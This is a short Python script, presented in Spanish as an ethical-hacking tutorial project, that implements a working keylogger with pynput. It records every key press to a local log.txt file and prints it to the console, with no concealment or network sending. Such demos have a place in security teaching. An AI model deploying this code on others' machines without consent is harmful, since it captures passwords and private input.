'''
PROYECTOS DE HACKING ETICO WITH PYTHON
KEYLOGGER CON PYTHON
'''

# Este proyecto implica la creación de un keylogger para registrar las teclas presionadas.

# Utilizando la biblioteca pynput, el siguiente código captura y almacena las entradas del teclado en un archivo.

from pynput import keyboard

# Función para registrar teclas presionadas
def on_press(key):
    try:
        print(f'Tecla presionada: {key.char}')
        with open("log.txt", "a") as f:
            f.write(f'Tecla presionada: {key.char}\n')
    except AttributeError:
        print(f'Tecla especial presionada: {key}')
        with open("log.txt", "a") as f:
            f.write(f'Tecla especial presionada: {key}\n')

# Función para detener el keylogger
def on_release(key):
    if key == keyboard.Key.esc:
        # Detener el keylogger
        return False

# Iniciar el keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()